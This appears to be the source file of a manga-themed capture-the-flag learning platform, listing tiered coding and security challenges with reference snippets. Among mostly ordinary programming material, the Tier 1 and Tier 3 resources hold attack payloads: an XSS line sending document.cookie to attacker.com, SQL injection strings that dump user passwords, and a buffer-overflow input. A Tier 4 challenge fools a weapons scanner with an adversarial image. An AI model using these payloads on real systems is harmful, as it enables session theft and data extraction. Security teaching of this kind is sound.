/**
 * EPHEMERAL — A HERO'S JOURNEY THROUGH CODE
 * Elden Ring UI · 8-Tier World Map · Manga-Inspired CTF Platform
 */

import React, { useState, useEffect, useMemo } from 'react';
import { Routes, Route, useNavigate, useLocation, Navigate } from 'react-router-dom';
import {
  Search, Zap, ChevronLeft, Play, CheckCircle2, ExternalLink,
  BookOpen, Target, Cpu, Terminal, Database, Network,
  Code, Layout, Layers, Flame
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

// ─────────────────────────────────────────────
// TYPES
// ─────────────────────────────────────────────
interface Episode {
  n: number; t: string; d: string;
  type: 'quiz' | 'research' | 'ctf';
  min: number; xp: number; done: boolean; ic: string;
  active?: boolean; locked?: boolean; tags?: string[];
  resources?: { t: string; s: string; d: string; code: string; url: string }[];
}
interface Domain {
  id: string; name: string; manga: string; col: string; bg: string;
  sfx: string; icon: React.ReactNode; image: string; cat: string;
  tier: number; arcs: number; battles: number; prog: number;
  desc: string; s1: string; s2: string; s3?: string;
  eps: Record<number, Episode[]>;
}

// ─────────────────────────────────────────────
// IMAGE URLS  (all public CDN / wikimedia)
// ─────────────────────────────────────────────
const IMG = {
  // Manga covers — MAL CDN
  berserk:   'https://cdn.myanimelist.net/images/manga/1/157897.jpg',
  onepiece:  'https://cdn.myanimelist.net/images/manga/2/253146.jpg',
  opm:       'https://cdn.myanimelist.net/images/manga/3/80234.jpg',
  chainsawman:'https://cdn.myanimelist.net/images/manga/3/216464.jpg',
  vinland:   'https://cdn.myanimelist.net/images/manga/2/188925.jpg',
  monster:   'https://cdn.myanimelist.net/images/manga/3/258224.jpg',
  dark:      'https://upload.wikimedia.org/wikipedia/en/f/f0/Dark_Netflix.jpg',
  century:   'https://cdn.myanimelist.net/images/manga/2/169984.jpg',
  blueperiod:'https://cdn.myanimelist.net/images/manga/2/222997.jpg',
  dororo:    'https://cdn.myanimelist.net/images/manga/1/130519.jpg',
  dandadan:  'https://cdn.myanimelist.net/images/manga/3/250616.jpg',
  choujinx:  'https://cdn.myanimelist.net/images/manga/3/253724.jpg',
  bluebox:   'https://cdn.myanimelist.net/images/manga/3/264213.jpg',
  kagurabachi:'https://cdn.myanimelist.net/images/manga/3/271295.jpg',
  zom100:    'https://cdn.myanimelist.net/images/manga/3/221877.jpg',
  actage:    'https://cdn.myanimelist.net/images/manga/3/209669.jpg',
  gto:       'https://cdn.myanimelist.net/images/manga/2/210481.jpg',
  real:      'https://cdn.myanimelist.net/images/manga/5/258985.jpg',
  // Art for hero screen — wikia / promotional
  heroArt:   'https://upload.wikimedia.org/wikipedia/en/a/af/Berserk_manga_volume_38.jpg',
  eldenring: 'https://upload.wikimedia.org/wikipedia/en/a/af/Elden_Ring_Box_art.jpg',
  // Character art
  guts:      'https://static.wikia.nocookie.net/berserk/images/4/40/Guts_Berserker_Armor_profile.png/revision/latest/scale-to-width-down/400?cb=20211117095142',
  luffy:     'https://static.wikia.nocookie.net/onepiece/images/6/6d/Monkey_D._Luffy_Anime_Post_Timeskip_Infobox.png/revision/latest/scale-to-width-down/400?cb=20230604153010',
};

// ─────────────────────────────────────────────
// DOMAIN DATA — ALL 8 TIERS
// ─────────────────────────────────────────────
const DOMAINS: Record<string, Domain> = {

  // ── TIER 0 ──────────────────────────────────
  t0_village: {
    id: 't0_village', tier: 0,
    name: 'THE TRAINING VILLAGE',
    manga: 'One Punch Man · Blue Box',
    col: '#22c55e', bg: 'linear-gradient(165deg,#001a0a,#000d05)',
    sfx: 'ROUTINE', icon: <Flame className="w-8 h-8"/>,
    image: IMG.opm, cat: 'TIER 0 · Programming Basics & Syntax',
    arcs: 2, battles: 9, prog: 85,
    desc: "Every legend starts with a gruelling, repetitive routine. 100 syntax drills. 100 loops. 100 functions. It's about building muscle memory so the basics become second nature — before the real world arrives and nothing forgives you.",
    s1: 'ARC I — THE DAILY REGIMEN (Variables, Loops, Logic)',
    s2: 'ARC II — THE ARSENAL (Functions, Arrays, Recursion)',
    eps: {
      1: [
        { n:1, t:"The First Steps — Declare Your Power Level",
          d:"Write a script to store and output your character's name, age, and initial power level. This is your origin story. Every variable is a choice about identity.",
          type:'quiz', min:15, xp:50, done:true, ic:'📝',
          tags:['Variables','Types','Python/JS'],
          resources:[
            { t:'Python Variables', s:'PYTHON DOCS', d:'Official guide to variable declaration and type inference.', code:"name = 'Saitama'\npower = 9999\nprint(f'{name}: {power}')", url:'https://docs.python.org/3/tutorial/introduction.html' },
            { t:'JavaScript Primitives', s:'MDN WEB DOCS', d:'String, Number, Boolean — the building blocks of any program.', code:"const name = 'Guts';\nconst power = Infinity;", url:'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures' }
          ]},
        { n:2, t:"The Repetitions — One Hundred Punches",
          d:"Write a for loop that outputs 'PUNCH!' 100 times. Then introduce a conditional: if the loop hits a prime number iteration, print 'CRITICAL HIT!' instead. Saitama's power came from repetition — so does yours.",
          type:'quiz', min:20, xp:80, done:true, ic:'👊',
          tags:['Loops','Conditionals','FizzBuzz-class'],
          resources:[
            { t:'For Loops Visualised', s:'PYTHONTUTOR', d:'Step through loop execution frame by frame.', code:"for i in range(1, 101):\n  if is_prime(i):\n    print('CRITICAL HIT!')\n  else:\n    print('PUNCH!')", url:'https://pythontutor.com' }
          ]},
        { n:3, t:"The Arsenal — Build Your Inventory System",
          d:"Create functions to add, remove, and sort items in an array. Return the index position of the strongest weapon. Taiki Inomata's shuttlecock collection is your data structure.",
          type:'ctf', min:30, xp:120, done:true, ic:'🎒',
          tags:['Arrays','Functions','Sorting'],
          resources:[
            { t:'Array Methods', s:'MDN WEB DOCS', d:'push, pop, sort, find, filter — the complete arsenal.', code:"const inventory = [];\nconst addItem = (item) => {\n  inventory.push(item);\n  return inventory.sort((a,b) => b.power - a.power);\n}", url:'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array' }
          ]},
      ],
      2: [
        { n:1, t:"The Blueprint — Classes & Object-Oriented Programming",
          d:"Model Taiki's training regime as a class. Properties: strength, stamina, technique. Methods: train(), rest(), compete(). Inheritance from a base Athlete class. OOP is how the world models itself.",
          type:'research', min:35, xp:150, done:true, ic:'📐',
          tags:['OOP','Classes','Inheritance']},
        { n:2, t:"The Recursion — Saitama Teaches the Cadet",
          d:"Implement a recursive fibonacci sequence, then refactor it with memoisation. Watch the exponential collapse into linear time. Feel Saitama's boredom as the recursion becomes trivial.",
          type:'ctf', min:40, xp:180, done:false, active:true, ic:'🔄',
          tags:['Recursion','Memoisation','Time Complexity']},
        { n:3, t:"The Final Exam — Build the Hero Registry",
          d:"Build a complete hero management system: register, rank, filter by class (S/A/B/C), and generate a sorted roster by power level. This is your graduation from the Training Village.",
          type:'ctf', min:50, xp:250, done:false, ic:'🏆',
          tags:['Integration','Data Structures','CRUD']},
      ]
    }
  },

  // ── TIER 1 ──────────────────────────────────
  t1_abyss: {
    id: 't1_abyss', tier: 1,
    name: 'THE ABYSS',
    manga: 'Berserk · Dororo · Vinland Saga',
    col: '#c41230', bg: 'linear-gradient(165deg,#1a0000,#080000)',
    sfx: 'ECLIPSE', icon: <Cpu className="w-8 h-8"/>,
    image: IMG.berserk, cat: 'TIER 1 · Low-Level Systems & Memory',
    arcs: 2, battles: 12, prog: 42,
    desc: "Your body has been stripped away. Hyakkimaru was born without limbs, eyes, or a voice — yet he fought through the Abyss to reclaim each piece from the demons that stole them. You will forge your sword from C, conquer the buffer, and claim what was taken.",
    s1: 'ARC I — THE GOLDEN AGE (C & Memory Management)',
    s2: 'ARC II — THE ECLIPSE (Buffer Overflows & Exploitation)',
    eps: {
      1: [
        { n:1, t:"Forging the Dragon Slayer — Custom malloc/free",
          d:"You are trapped in a constrained C environment. Write a custom memory allocator (malloc/free) that survives a stress test without leaking a single byte. Guts forged his sword from raw iron — this is the same discipline.",
          type:'ctf', min:60, xp:300, done:true, ic:'⚔️',
          tags:['C','Memory','Allocator'],
          resources:[
            { t:'Memory Allocation in C', s:'CARNEGIE MELLON', d:"How malloc, free, and the heap work at the OS level.", code:"void* my_malloc(size_t size) {\n  // Your implementation:\n  // 1. Find free block\n  // 2. Split if too large\n  // 3. Return pointer\n}", url:'https://www.cs.cmu.edu/afs/cs/academic/class/15213-f10/www/lectures/17-malloc1.pdf' },
            { t:'Writing malloc from scratch', s:'DANLUU', d:'A practical walkthrough of implementing a heap allocator.', code:"struct block_header {\n  size_t size;\n  int is_free;\n  struct block_header *next;\n};", url:'https://danluu.com/malloc-tutorial/' }
          ]},
        { n:2, t:"Hyakkimaru's Senses — Pointer Arithmetic",
          d:"Hyakkimaru sensed the world through touch alone — pointers give you the same direct contact with memory. Navigate a linked list of 'demon nodes' using only raw pointer arithmetic. No array indexing allowed.",
          type:'quiz', min:40, xp:200, done:true, ic:'👁️',
          tags:['Pointers','C','Memory Layout']},
        { n:3, t:"Thorfinn's Stack — Understanding the Call Stack",
          d:"Trace the exact call stack as Thorfinn's training subroutines recurse. Draw the stack frames. Identify where the return address lives. This is the anatomy of every program that ever ran.",
          type:'research', min:35, xp:150, done:false, active:true, ic:'📚',
          tags:['Stack','Call Stack','Assembly basics']},
      ],
      2: [
        { n:1, t:"THE ECLIPSE — Buffer Overflow to Code Execution",
          d:"A vulnerable C program exists. Intentionally cause a buffer overflow to overwrite the instruction pointer, hijacking the execution flow to print the hidden flag. The Eclipse was a thousand demons — this is one vulnerable strcpy.",
          type:'ctf', min:90, xp:500, done:false, ic:'🩸',
          tags:['Buffer Overflow','Exploitation','RIP Overwrite'],
          resources:[
            { t:'Smashing the Stack for Fun and Profit', s:'PHRACK · 1996', d:'The original paper on stack buffer overflow exploitation.', code:"char buf[64];\n// strcpy with no bounds check = Eclipse\nstrcpy(buf, user_input);", url:'http://phrack.org/issues/49/14.html' },
            { t:'Buffer Overflow — picoCTF', s:'PICOCTF', d:'Guided buffer overflow challenges from beginner to advanced.', code:"python3 -c \"print('A'*72 + '\\xde\\xad\\xbe\\xef')\" | ./vuln", url:'https://picoctf.org/' }
          ]},
        { n:2, t:"Askeladd's Deception — Format String Attacks",
          d:"Askeladd manipulated information to survive. A format string vulnerability lets you read and write arbitrary memory using printf. Find the flag hidden in the stack — Askeladd's secret was always within reach.",
          type:'ctf', min:75, xp:400, done:false, locked:true, ic:'📜',
          tags:['Format String','printf vuln','Memory Read']},
      ]
    }
  },

  // ── TIER 2 ──────────────────────────────────
  t2_megastructure: {
    id: 't2_megastructure', tier: 2,
    name: 'THE MEGASTRUCTURE',
    manga: 'DARK · Ghost in the Shell · Akira',
    col: '#7c3aed', bg: 'linear-gradient(165deg,#0e0520,#050210)',
    sfx: 'CONTROL', icon: <Terminal className="w-8 h-8"/>,
    image: IMG.dark, cat: 'TIER 2 · OS Internals & Bootloaders',
    arcs: 2, battles: 10, prog: 20,
    desc: "A cold, hyper-minimalist, infinitely complex environment. You are a scavenger in Winden's automated labyrinth — every door is locked by the OS, every corridor a kernel syscall. You must interface directly with the architecture's core logic to survive.",
    s1: 'ARC I — THE PASSAGE (Kernel, Syscalls & Boot)',
    s2: 'ARC II — THE KNOT (Process Isolation & Namespaces)',
    eps: {
      1: [
        { n:1, t:"Bypassing the Silicon Guard — Write a Bootloader",
          d:"The system's boot sequence is locked down by the BIOS firmware. Write and configure a minimal x86 bootloader in Assembly (or configure Limine) that initialises your environment and drops into a shell. You own the machine before the OS breathes.",
          type:'ctf', min:120, xp:600, done:false, active:true, ic:'🔌',
          tags:['Assembly','Bootloader','x86','BIOS/UEFI'],
          resources:[
            { t:'OSDev Wiki — Bootloader', s:'OSDEV.ORG', d:'The definitive community resource for OS and bootloader development.', code:"[bits 16]\n[org 0x7c00]\n\nstart:\n  mov ax, 0x0E41  ; BIOS teletype 'A'\n  int 0x10\n  jmp $           ; hang\n\ntimes 510-($-$$) db 0\ndw 0xAA55         ; boot signature", url:'https://wiki.osdev.org/Rolling_Your_Own_Bootloader' },
            { t:'Writing an OS in Rust', s:'PHIL-OPP.COM', d:'Modern approach to bare-metal OS development.', code:"#![no_std]\n#![no_main]\n\n#[no_mangle]\npub extern \"C\" fn _start() -> ! {\n  loop {}\n}", url:'https://os.phil-opp.com/' }
          ]},
        { n:2, t:"Terminal Override — Configure Hyprland & Status Bar",
          d:"Strip away the bloated, unusable desktop environment. Configure Hyprland (Wayland compositor) with a custom status bar showing real system threats: CPU load, RAM pressure, network activity. The Terminal Override is your environment — own it.",
          type:'research', min:90, xp:400, done:false, ic:'🖥️',
          tags:['Hyprland','Wayland','dotfiles','Minimalism'],
          resources:[
            { t:'Hyprland Wiki', s:'HYPRLAND.ORG', d:'Official documentation for the Hyprland Wayland compositor.', code:"# hyprland.conf\nmonitor=,preferred,auto,1\nexec-once=waybar\ngeneral {\n  gaps_in=5\n  border_size=2\n}", url:'https://wiki.hyprland.org/' }
          ]},
        { n:3, t:"The Jonas Loop — Circular Dependency Deadlocks",
          d:"Jonas's time loop is a distributed deadlock — every action requires a prior action, and no one can proceed. Reproduce and resolve a deadlock in a multi-threaded C program. Identify the hold-and-wait cycle. Break the Knot.",
          type:'quiz', min:60, xp:280, done:false, ic:'∞',
          tags:['Deadlock','Threading','Concurrency']},
      ],
      2: [
        { n:1, t:"Winden's Namespaces — Linux Process Isolation",
          d:"Three timelines that never touch — Linux namespaces give containers the same isolation. Create isolated PID, network, and mount namespaces from scratch using unshare. No Docker allowed. Build the cage yourself.",
          type:'ctf', min:80, xp:380, done:false, ic:'📦',
          tags:['Namespaces','cgroups','Containers'],
          resources:[
            { t:'Linux Namespaces in Operation', s:'LWN.NET', d:'The authoritative series on how namespaces work at the kernel level.', code:"sudo unshare \\\n  --pid --mount \\\n  --fork --mount-proc \\\n  /bin/bash\n# Now you are PID 1 in a new world", url:'https://lwn.net/Articles/531114/' }
          ]},
        { n:2, t:"The CAP Theorem of Winden — Consistency vs Availability",
          d:"When the network between timelines partitions — choose: do all nodes see the same state (Adam or Eva's version), or does every node respond (even with stale data)? Implement a simple key-value store that handles network partition gracefully.",
          type:'research', min:70, xp:320, done:false, locked:true, ic:'⚖️',
          tags:['Distributed Systems','CAP','Consistency']},
      ]
    }
  },

  // ── TIER 3 ──────────────────────────────────
  t3_grandline: {
    id: 't3_grandline', tier: 3,
    name: 'THE GRAND LINE',
    manga: 'One Piece · Chainsaw Man · Dandadan',
    col: '#00b4ff', bg: 'linear-gradient(165deg,#001428,#000810)',
    sfx: 'BREACH', icon: <Network className="w-8 h-8"/>,
    image: IMG.chainsawman, cat: 'TIER 3 · Web Security & Reconnaissance',
    arcs: 3, battles: 18, prog: 30,
    desc: "A massive, interconnected ocean of servers, protocols, and vulnerabilities. You are navigating hostile waters filled with rival crews, malware spirits, and devil contracts. Intercept their communications. Exploit their defences. Claim the Poneglyph.",
    s1: 'ARC I — EAST BLUE (Recon & Enumeration)',
    s2: 'ARC II — GRAND LINE (Web Exploitation)',
    s3: 'ARC III — NEW WORLD (Advanced Attacks)',
    eps: {
      1: [
        { n:1, t:"Den Den Mushi Interception — HTTP Traffic Analysis",
          d:"Use Burp Suite to intercept, manipulate, and forward HTTP requests between a chaotic malware spirit and its command-and-control server. Steal the access token hidden in the request headers. The Den Den Mushi always reveals the caller.",
          type:'ctf', min:60, xp:280, done:true, ic:'🐌',
          tags:['Burp Suite','HTTP','Traffic Analysis'],
          resources:[
            { t:'Web Security Academy', s:'PORTSWIGGER', d:'The definitive free web security learning platform from the creators of Burp Suite.', code:"GET /api/flag HTTP/1.1\nHost: target.ctf\nAuthorization: Bearer <INTERCEPT_ME>", url:'https://portswigger.net/web-security' },
            { t:'OWASP Top 10', s:'OWASP', d:'The ten most critical web application security risks.', code:"A01: Broken Access Control\nA02: Cryptographic Failures\nA03: Injection\n...", url:'https://owasp.org/www-project-top-ten/' }
          ]},
        { n:2, t:"The Cursed Blade — XSS Session Hijack",
          d:"Exploit an intentionally vulnerable web application using Cross-Site Scripting (XSS) to hijack an admin's session cookie. Chihiro's blade cuts through defences that look solid — a single unescaped innerHTML is your opening.",
          type:'ctf', min:75, xp:350, done:true, ic:'⚔️',
          tags:['XSS','Session Hijacking','JavaScript'],
          resources:[
            { t:'XSS Payloads', s:'PORTSWIGGER', d:'All XSS vectors, contexts, and bypass techniques.', code:"<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>", url:'https://portswigger.net/web-security/cross-site-scripting' }
          ]},
        { n:3, t:"Nami's Log Pose — Directory Enumeration & OSINT",
          d:"The target's subdomains are uncharted islands. Use tools like ffuf, gobuster, and Shodan to enumerate hidden endpoints, exposed admin panels, and leaked credentials. Chart the ocean before you sail it.",
          type:'ctf', min:50, xp:220, done:false, active:true, ic:'🧭',
          tags:['OSINT','Enumeration','Shodan','ffuf']},
      ],
      2: [
        { n:1, t:"Gun Devil's Command Server — SQL Injection",
          d:"The Gun Devil's target list is stored in a database. The search form is unsanitised. Extract the entire targets table using SQL injection — UNION, blind time-based, error-based — until the flag is yours.",
          type:'ctf', min:80, xp:400, done:false, ic:'💉',
          tags:['SQLi','Database','UNION Attack'],
          resources:[
            { t:'SQL Injection Explained', s:'PORTSWIGGER', d:'Complete guide to SQL injection: UNION, error-based, blind.', code:"' OR 1=1--\n' UNION SELECT username,password,NULL FROM users--", url:'https://portswigger.net/web-security/sql-injection' }
          ]},
        { n:2, t:"Makima's Control Grid — IDOR & Broken Access Control",
          d:"Makima's network assigns each pawn a numerical ID. Increment the id parameter in the API request from your own profile to access the admin account. Insecure Direct Object References: the most common vulnerability in real production systems.",
          type:'ctf', min:60, xp:300, done:false, ic:'🕷️',
          tags:['IDOR','Access Control','API']},
        { n:3, t:"Turbo Granny's Server — SSRF to Internal Services",
          d:"The web application fetches URLs on your behalf. Redirect it to http://localhost:8080/admin or the cloud metadata endpoint. Server-Side Request Forgery: make the server attack itself — the ghost that's already inside.",
          type:'ctf', min:90, xp:450, done:false, locked:true, ic:'👻',
          tags:['SSRF','Cloud Metadata','Internal Services']},
      ],
      3: [
        { n:1, t:"Buster Call Protocol — Race Conditions in Web Apps",
          d:"Five simultaneous HTTP requests to the same coupon redemption endpoint. Timing precision at millisecond scale. Exploit a race condition to redeem a single-use coupon five times before the server's lock takes effect.",
          type:'ctf', min:100, xp:500, done:false, ic:'⚡',
          tags:['Race Condition','TOCTOU','Concurrent Requests']},
      ]
    }
  },

  // ── TIER 4 ──────────────────────────────────
  t4_oracle: {
    id: 't4_oracle', tier: 4,
    name: 'THE ORACLE',
    manga: 'Monster · 20th Century Boys · One Piece ML',
    col: '#f5c518', bg: 'linear-gradient(165deg,#1a1200,#090700)',
    sfx: 'PROPHECY', icon: <Target className="w-8 h-8"/>,
    image: IMG.monster, cat: 'TIER 4 · AI, LLMs & Deep Learning',
    arcs: 3, battles: 15, prog: 68,
    desc: "The domain of psychological dread, pattern recognition, and uncovering the truth hidden inside massive amounts of data. Johann Liebert manipulated the world through prediction. You will build the models that see what others cannot.",
    s1: 'ARC I — THE SURGEON (ML Foundations)',
    s2: 'ARC II — THE NAMELESS MONSTER (Transformers & LLMs)',
    s3: 'ARC III — THE PROPHECY (Adversarial AI)',
    eps: {
      1: [
        { n:1, t:"Tenma's Decision Function — Neural Networks from Scratch",
          d:"No PyTorch. No Keras. Build a feedforward neural network from scratch using only NumPy. Implement forward pass, backpropagation, and gradient descent manually. Dr. Tenma built the most important thing in the world without a blueprint.",
          type:'ctf', min:120, xp:600, done:true, ic:'🧠',
          tags:['Python','NumPy','Backprop','Neural Nets'],
          resources:[
            { t:'Neural Networks from Scratch', s:'HARRISON KINSLEY', d:'Complete book on building neural networks without frameworks.', code:"class NeuralNetwork:\n  def forward(self, X):\n    self.z1 = X @ self.W1 + self.b1\n    self.a1 = self.relu(self.z1)\n    return self.a1 @ self.W2 + self.b2", url:'https://nnfs.io/' },
            { t:"Let's build micrograd", s:'ANDREJ KARPATHY', d:'Building autograd and backprop from first principles.', code:"class Value:\n  def __init__(self, data):\n    self.data = data\n    self.grad = 0\n    self._backward = lambda: None", url:'https://www.youtube.com/watch?v=VMj-3S1tku0' }
          ]},
        { n:2, t:"Winden Temporal Chains — Backpropagation & Chain Rule",
          d:"Like Dark's time loop — every event causes itself backwards. Implement the chain rule through a 5-layer network. Visualise gradient flow. Find the vanishing gradient failure. Break the loop.",
          type:'research', min:80, xp:380, done:true, ic:'🔗',
          tags:['Backprop','Calculus','Vanishing Gradient']},
        { n:3, t:"Saitama's Training Regime — Gradient Descent Variants",
          d:"100 push-ups, 100 sit-ups, 100 squats, 10km every day. Implement SGD, Momentum, RMSprop, and Adam from scratch. Compare convergence curves on the same loss landscape. Choose the right routine.",
          type:'quiz', min:60, xp:280, done:true, ic:'💪',
          tags:['Optimization','Adam','SGD','Learning Rate']},
      ],
      2: [
        { n:1, t:"Building the Brain — Miniature LLM in PyTorch",
          d:"Write a miniature Large Language Model from scratch in PyTorch. Implement Rotary Positional Embeddings (RoPE), multi-head self-attention, and causal masking manually. This is the mathematical skeleton of every LLM that has ever existed.",
          type:'ctf', min:180, xp:900, done:false, active:true, ic:'🤖',
          tags:['Transformer','PyTorch','RoPE','Attention'],
          resources:[
            { t:"Let's build GPT from scratch", s:'ANDREJ KARPATHY', d:'The definitive video: building a GPT character-level language model.', code:"class MultiHeadAttention(nn.Module):\n  def forward(self, x):\n    B,T,C = x.shape\n    q = self.q_proj(x)\n    k = self.k_proj(x)\n    v = self.v_proj(x)\n    att = (q @ k.transpose(-2,-1)) * (C**-0.5)\n    att = F.softmax(att.masked_fill(self.mask==0, float('-inf')), dim=-1)\n    return att @ v", url:'https://www.youtube.com/watch?v=kCc8FmEb1nY' },
            { t:'Rotary Positional Embeddings', s:'ARXIV 2021', d:'The RoPE paper — relative positional encoding via rotation matrices.', code:"def rotate_half(x):\n  x1, x2 = x.chunk(2, dim=-1)\n  return torch.cat((-x2, x1), dim=-1)", url:'https://arxiv.org/abs/2104.09864' }
          ]},
        { n:2, t:"Makima's Attention Field — Vision Transformers",
          d:"Makima sees everyone without looking. Vision Transformers implement global self-attention across image patches — Aokiji's full battlefield awareness vs Akainu's single burning point. Implement ViT from scratch and explain why CNNs lost.",
          type:'research', min:90, xp:420, done:false, ic:'👁️',
          tags:['ViT','Computer Vision','Patch Embeddings']},
      ],
      3: [
        { n:1, t:"The Perfect Crime — Adversarial Attack on a Classifier",
          d:"Alter fewer than 50 pixels in an image of a firearm so that a trained security scanner classifies it as a bouquet of flowers. The adversarial example must be visually imperceptible to a human. Johann committed the perfect crime — your attack must too.",
          type:'ctf', min:150, xp:750, done:false, ic:'🌸',
          tags:['Adversarial ML','FGSM','PGD Attack'],
          resources:[
            { t:'Explaining and Harnessing Adversarial Examples', s:'GOODFELLOW ET AL · 2015', d:'The foundational paper on FGSM adversarial attacks.', code:"# FGSM Attack\nperturbation = epsilon * sign(gradient)\nadversarial = original_image + perturbation", url:'https://arxiv.org/abs/1412.6572' }
          ]},
      ]
    }
  },

  // ── TIER 5 ──────────────────────────────────
  t5_ghost: {
    id: 't5_ghost', tier: 5,
    name: 'GHOST IN THE MACHINE',
    manga: 'Real · Ghost in the Shell · Choujin X',
    col: '#00e5c3', bg: 'linear-gradient(165deg,#001a18,#000d0c)',
    sfx: 'ALGORITHM', icon: <Code className="w-8 h-8"/>,
    image: IMG.real, cat: 'TIER 5 · Graph Theory & Advanced Algorithms',
    arcs: 2, battles: 14, prog: 15,
    desc: "You are tracking an autonomous entity through a shifting digital metropolis. Nomiya wheels through the city solving path problems that able-bodied people never think about. Tokio's Beast Form awakening is O(1) — but getting there is O(n log n). Master the graph.",
    s1: 'ARC I — THE COMMUTE (Pathfinding & Graph Algorithms)',
    s2: 'ARC II — THE DATABASE ENGINE (Performance Optimisation)',
    eps: {
      1: [
        { n:1, t:"The Commute — Offline Navigation System with GNNs",
          d:"The city's transit grid has been scrambled. Build an AI-driven offline navigation tool using Graph Neural Networks or advanced pathfinding (A*, Dijkstra, Bellman-Ford) that calculates the optimal route. Nomiya cannot afford a poor route — neither can you.",
          type:'ctf', min:150, xp:750, done:false, active:true, ic:'🗺️',
          tags:['Dijkstra','A*','GNN','Graph Theory'],
          resources:[
            { t:'Graph Neural Networks', s:'DISTILL.PUB', d:'A gentle but rigorous introduction to GNNs.', code:"class GNNLayer(nn.Module):\n  def forward(self, x, adj):\n    # Aggregate neighbours\n    return F.relu(adj @ x @ self.W)", url:'https://distill.pub/2021/understanding-gnns/' },
            { t:'A* Pathfinding Visualised', s:'RED BLOB GAMES', d:'Interactive visualisation of every pathfinding algorithm.', code:"def heuristic(a, b):\n  return abs(b[0]-a[0]) + abs(b[1]-a[1])", url:'https://www.redblobgames.com/pathfinding/a-star/introduction.html' }
          ]},
        { n:2, t:"Tokio's Beast Form — NP-Hard Problems",
          d:"Tokio's Beast Form awakens in an instant — but the travelling salesman must visit 50 cities. Prove TSP is NP-Hard, implement a greedy approximation, then a 2-opt local search improvement. Some transformations cannot be rushed.",
          type:'research', min:90, xp:420, done:false, ic:'🦾',
          tags:['NP-Hard','TSP','Approximation Algorithms']},
        { n:3, t:"Maximum Flow Through the Devil Network",
          d:"The Monster Association's supply routes form a directed weighted graph. Find the maximum flow from their base to the human city using Ford-Fulkerson or Dinic's algorithm. Cut the minimum edges to halt all supply.",
          type:'ctf', min:120, xp:580, done:false, locked:true, ic:'🌊',
          tags:['Max Flow','Min Cut','Dinic\'s Algorithm']},
      ],
      2: [
        { n:1, t:"The Database Engine — O(n) to O(log n)",
          d:"A custom C database engine scans a 10-million row table linearly. Rewrite the indexing logic to convert the O(n) search query into O(log n) using a B-Tree index. Extract the flag before the server times out at 3 seconds. Real performance engineering under a real deadline.",
          type:'ctf', min:120, xp:600, done:false, ic:'⚡',
          tags:['B-Tree','C','Database Internals','Performance'],
          resources:[
            { t:'Database Internals', s:'ALEX PETROV · O\'REILLY', d:'The definitive book on storage engines, B-Trees, and LSM-trees.', code:"struct btree_node {\n  int keys[MAX_KEYS];\n  int n_keys;\n  struct btree_node *children[MAX_KEYS+1];\n  bool is_leaf;\n};", url:'https://www.databass.dev/' }
          ]},
        { n:2, t:"Consistent Hashing the City Grid",
          d:"How do you distribute Nomiya's route requests across 50 navigation servers without a single point of control? Implement consistent hashing: adding or removing a server should only reroute 1/n of the requests, not all of them.",
          type:'quiz', min:80, xp:380, done:false, locked:true, ic:'⭕',
          tags:['Consistent Hashing','Distributed','Load Balancing']},
      ]
    }
  },

  // ── TIER 6 ──────────────────────────────────
  t6_ruleset: {
    id: 't6_ruleset', tier: 6,
    name: 'THE ABSOLUTE RULESET',
    manga: 'DARK · 20th Century Boys · Kagurabachi',
    col: '#8b5cf6', bg: 'linear-gradient(165deg,#0d0520,#060310)',
    sfx: 'CONSENSUS', icon: <Database className="w-8 h-8"/>,
    image: IMG.century, cat: 'TIER 6 · Distributed Systems & Real-Time',
    arcs: 2, battles: 12, prog: 5,
    desc: "Locked in a high-stakes battle of wits — Kira vs L, Kenji vs the Friend. The only way to win is to ensure your commands execute flawlessly across distributed nodes without your adversary desyncing your state. One dropped WebSocket. One split-brain database. That's all it takes.",
    s1: 'ARC I — THE DEATH NOTE (Consensus & Replication)',
    s2: 'ARC II — THE PERFECT SYNC (Real-Time Systems)',
    eps: {
      1: [
        { n:1, t:"Raft Consensus — Who Controls the Resistance?",
          d:"After the Friend disappeared, who was in charge of Kenji's cells? Implement the Raft consensus algorithm: leader election, log replication, and fault tolerance when nodes fail. 3 nodes must agree on a single truth — or the resistance fractures.",
          type:'ctf', min:180, xp:900, done:false, active:true, ic:'👑',
          tags:['Raft','Consensus','Distributed','Go'],
          resources:[
            { t:'The Secret Lives of Data', s:'ONGARO & OUSTERHOUT', d:'An interactive visualisation of the Raft consensus algorithm.', code:"if (term > currentTerm) {\n  currentTerm = term;\n  state = FOLLOWER;\n  votedFor = null;\n}\n// RequestVote RPC handler", url:'http://thesecretlivesofdata.com/raft/' },
            { t:'MIT 6.824 Distributed Systems', s:'MIT · 2024', d:"Raft lab with complete specification. The hardest distributed systems course on earth.", code:"// Lab 2: Raft\nfunc (rf *Raft) RequestVote(args *RequestVoteArgs, reply *RequestVoteReply) {\n  rf.mu.Lock()\n  defer rf.mu.Unlock()\n}", url:'https://pdos.csail.mit.edu/6.824/' }
          ]},
        { n:2, t:"The Friend's Archive — CRDTs for Conflict-Free Replication",
          d:"The Friend maintained identical copies of his prophecy in cells that never communicated. CRDTs (Conflict-free Replicated Data Types) allow distributed nodes to merge state without coordination. Implement a G-Counter and an OR-Set.",
          type:'research', min:120, xp:580, done:false, ic:'🔄',
          tags:['CRDT','Eventual Consistency','Distributed State']},
        { n:3, t:"Chihiro's Blade — TrueTime & Google Spanner",
          d:"Chihiro's enchanted blade always strikes at the exact moment — absolute synchronised timing in a distributed world. Google Spanner uses TrueTime: atomic clocks in every datacenter. Implement a simplified globally-synchronised commit using logical clocks.",
          type:'quiz', min:90, xp:440, done:false, locked:true, ic:'⚔️',
          tags:['Spanner','TrueTime','Global Transactions']},
      ],
      2: [
        { n:1, t:"THE PERFECT SYNC — Real-Time Collaborative Code Editor",
          d:"Build the backend for a real-time collaborative code editor. If your WebSockets drop or your operational transform fails to sync, your adversary alters the file and wins. The absolute ruleset: every user sees the same document at all times.",
          type:'ctf', min:240, xp:1200, done:false, ic:'💻',
          tags:['WebSockets','OT','CRDT','Real-Time'],
          resources:[
            { t:'Operational Transformation', s:'NEIL FRASER · 2014', d:'Deep dive into the algorithm powering Google Docs real-time sync.', code:"function transform(op1, op2) {\n  // If op1 is INSERT at pos p1 and\n  // op2 is INSERT at pos p2 < p1:\n  return {...op1, position: op1.position + 1};\n}", url:'https://neil.fraser.name/writing/sync/' },
